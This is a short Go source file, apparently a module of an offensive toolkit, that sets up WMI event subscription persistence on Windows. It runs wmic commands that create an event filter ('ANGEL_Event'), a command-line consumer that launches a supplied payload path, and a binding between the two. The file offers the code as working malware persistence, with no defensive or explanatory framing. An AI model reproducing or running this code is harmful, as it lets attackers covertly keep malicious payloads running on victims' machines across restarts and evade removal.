//go:build windows

package persistence

import (
"os/exec"
)

func WMIEventPersist(payloadPath string) bool {
cmd := exec.Command("cmd", "/c", "wmic /namespace:\\\\root\\subscription path __eventfilter create name='ANGEL_Event', eventnamespace='root\\cimv2', querylanguage='WQL', query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=\"payload.exe\"'")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func WMICommandPersist(payloadPath string) bool {
cmd := exec.Command("cmd", "/c", "wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer create name='ANGEL_Consumer', commandlinetemplate='"+payloadPath+"'")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func WMIBindingPersist() bool {
cmd := exec.Command("cmd", "/c", "wmic /namespace:\\\\root\\subscription path __filtertoconsumerbinding create filter='ANGEL_Event', consumer='ANGEL_Consumer'")
err := cmd.Run()
if err != nil {
return false
}
return true
}
